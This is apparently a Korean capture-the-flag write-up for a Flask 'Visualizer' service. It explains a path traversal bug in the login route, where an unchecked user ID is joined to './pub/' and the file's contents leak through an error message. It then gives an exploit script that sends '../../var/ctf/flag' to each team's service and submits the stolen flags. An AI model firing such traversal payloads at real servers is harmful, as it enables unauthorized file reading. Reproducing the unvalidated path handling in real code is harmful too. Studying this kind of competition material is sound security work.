# Service 3. Visualizer

## Attack Vector and Vulnerability

Service3은SLA log를 보여주기 위한 web service가 있다.
아래 코드는 해당 web service에 로그인를 처리하는 부분의 코드이다.
로그인 시 id 값을 유저입력으로 받는데, 이부분이 Attack Vector가된다.

```python
# login page
# GET  - display login page(input ID box)
# POST - user submitted github ID
@app.route('/login', methods=['GET', 'POST'])
def login():
    if flask.request.method == 'POST':
        global FINGERPRINT
        global PASSPHRASE
        githubID = flask.request.form['id']
        keypath = './pub/' + githubID

        # check github ID by finding public key
        if not os.path.exists(keypath) or os.path.isdir(keypath):
            return flask.Response('No public key')
        data = file_read(keypath)
        pubkey = gpg.import_keys(data)
        if len(pubkey.fingerprints) == 0:
            return flask.Response('%s is not public key\n%s'%(keypath,data))
        challenge = str(random.getrandbits(256))
        flask.session['id'] = githubID
        flask.session['challenge'] = challenge
        challenge = gpg.encrypt(challenge, pubkey.fingerprints[0], always_trust=True, default_key=KEYID, passphrase=PASSPHRASE)
        flask.session['encChallenge'] = str(challenge)
        return flask.redirect('/auth')

    return flask.render_template('login.html')

```
위 코드를 보면, 유저 입력으로 받은 값을 ./pub에 더한 뒤 파일을 읽는다.
이 과정에서 사용자 입력값에 대한 검사가 없으므로 *path traversal* 공격이
가능하다.
넣어준 path의 파일의 fingerprints가 존재하지 않을 경우, 에러로 해당파일의 내용을
웹페이지에 프린트 해주기 때문에 id에 적절히 ../를 더해 flag 파일을 읽어올 수 있다.

'''

## Exploit Script

```python
# written by blukat29

import requests
import os
import re
import time

fname = ‘/var/ctf/flag’

def ex(team):

   domain = ‘http://localhost:80%d3' % team
    s = requests.Session()
    r = s.post(domain + ‘/login’, data={‘id’:‘../../../../../../../../var/ctf/flag’})
    return r.content.split(‘key’)[1].strip()

for i in (1,2,3,4,6):
    try:
        print i
        flag = ex(i)
        os.system(‘python submit.py %d 3 %s’ % (i, flag))
    except:
        pass
```
